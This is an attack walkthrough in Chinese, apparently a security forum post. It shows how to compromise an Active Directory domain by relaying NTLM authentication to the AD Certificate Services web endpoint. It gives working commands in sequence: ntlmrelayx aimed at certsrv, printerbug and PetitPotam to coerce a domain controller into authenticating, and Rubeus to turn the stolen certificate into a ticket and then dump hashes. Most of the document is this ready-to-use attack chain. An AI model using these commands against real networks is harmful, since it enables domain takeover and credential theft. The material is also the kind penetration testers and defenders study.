前言
==

当AD安装证书服务后，存在一个HTTP端点：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6104dbb38ec7d76ce3743fbfa309b29420c35e86.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6104dbb38ec7d76ce3743fbfa309b29420c35e86.png)

攻击者可以利用NTLM Over HTTP来进行ntlmrelay攻击。

详细的介绍可以参考：<https://posts.specterops.io/certified-pre-owned-d95910965cd2>

环境介绍
====

攻击机器：192.168.8.164

AD域控（SRV-DC）：192.168.8.144

AD辅域（SRV-DC2）：192.168.8.155

攻击流程
====

默认普通用户普通权限：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eafbac3ea09d52fa9c56f6d03571481b63ba6242.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eafbac3ea09d52fa9c56f6d03571481b63ba6242.png)

使用impacket，更新下这里的pull：  
` https://github.com/SecureAuthCorp/impacket/pull/1101 `

攻击机器开启监听：

```php
ntlmrelayx.py -t http://192.168.8.144/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller'
```

注意，这里的template参数值得做好适配。

利用打印机服务，使辅域进行强连回来：

```php
python printerbug.py domain.org/user:password@192.168.8.155 192.168.8.164
```

ntlmrelayx成功进行relay，并获取到证书信息：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c07bc077bcf59c64ee3a507ea92ee806ffba400.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c07bc077bcf59c64ee3a507ea92ee806ffba400.png)

利用证书获取tgt并注入：

```php
Rubeus.exe asktgt /user:SRV-DC2$ /certificate:certificatebase64body /ptt
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-96bb6ec911ea9b6bdfa6872ffc0334e4c2d05df5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-96bb6ec911ea9b6bdfa6872ffc0334e4c2d05df5.png)

成功dump hash：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b100e897306bad8e2139d81359136eba549c3e75.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b100e897306bad8e2139d81359136eba549c3e75.png)

通过新出来的EFSRPC协议强连也可以做到同样的效果：

```php
python Petitpotam.py -u user -p password -d domain.org 192.168.8.164 192.168.8.155
```

总结
==

上述攻击流程中，除了我标粗的需要注意以外，还需要注意不能relay给自身、子域没权限也不能relay。（感谢daiker）

利用类似打印机服务手法进行ntlmrelay攻击时，除了上述提到的攻击AD CS，还有非约束委派、 CVE-2019-1040的基于资源的约束委派等攻击手法。